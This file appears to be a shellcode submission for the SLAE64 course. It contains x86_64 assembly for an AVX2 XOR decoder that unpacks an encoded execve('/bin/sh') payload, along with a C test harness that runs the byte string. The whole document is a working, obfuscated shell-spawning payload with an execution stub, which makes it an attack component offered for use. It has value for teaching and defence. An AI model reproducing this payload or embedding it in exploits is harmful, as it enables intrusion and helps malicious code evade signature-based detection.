/*
; Title		: Linux/x86_64 - AVX2 XOR Decoder + execve("/bin/sh") (62 bytes)
; Date		: 2019-08-18
; Author	: Gonçalo Ribeiro (@goncalor)
; Website	: goncalor.com
; SLAE64-ID	: 1635

; this only works on machines with a CPU that supports AVX2 instructions

global _start

_start:
    jmp call_decoder

decoder:
    pop rsi
    lea rdi, [rsi+1]

    ; shellcode is less than 32 bytes long. can decode with single 256-bit xor.
    ; for longer shellcodes a loop could be added
    vpbroadcastb ymm1, [rsi]  ; avx2
    vmovdqu ymm0, [rdi]       ; avx
    vpxor ymm0, ymm1          ; avx2
    vmovdqu [rdi], ymm0       ; avx

    jmp encoded_shellcode

call_decoder:
    call decoder
    xor_value: db 0xaa
    encoded_shellcode: db 0xe2,0x9b,0x6a,0xfa,0xe2,0x23,0x48,0xe2,0x14,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xfc,0xe2,0x23,0x4d,0xfa,0xfd,0xe2,0x23,0x4c,0x1a,0x91,0xa5,0xaf
*/


#include <stdio.h>
#include <string.h>

char code[] =
"\xeb\x18\x5e\x48\x8d\x7e\x01\xc4\xe2\x7d\x78\x0e\xc5\xfe\x6f\x07\xc5\xfd"
"\xef\xc1\xc5\xfe\x7f\x07\xeb\x06\xe8\xe3\xff\xff\xff\xaa\xe2\x9b\x6a\xfa"
"\xe2\x23\x48\xe2\x14\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xfc\xe2\x23\x4d\xfa"
"\xfd\xe2\x23\x4c\x1a\x91\xa5\xaf";

int main() {
    printf("length: %lu\n", strlen(code));
    ((int(*)()) code)();
}